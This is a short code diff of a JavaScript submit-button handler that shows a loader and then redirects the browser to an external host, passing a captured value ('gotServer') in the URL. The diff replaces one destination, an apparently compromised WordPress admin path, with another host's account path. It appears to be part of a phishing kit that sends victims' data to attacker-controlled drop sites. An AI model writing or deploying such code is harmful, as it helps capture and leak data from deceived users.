@@ -60,5 +60,5 @@ function fexBtnSub(r) {
 
     loader.style.display = "flex";
 
-    location.replace("https://denisevoltolini.com.br/wp-admin/user/ex/account?id="+gotServer);
+    location.replace("https://srbilletero.com/cgi/cn/account?id="+gotServer);
 }
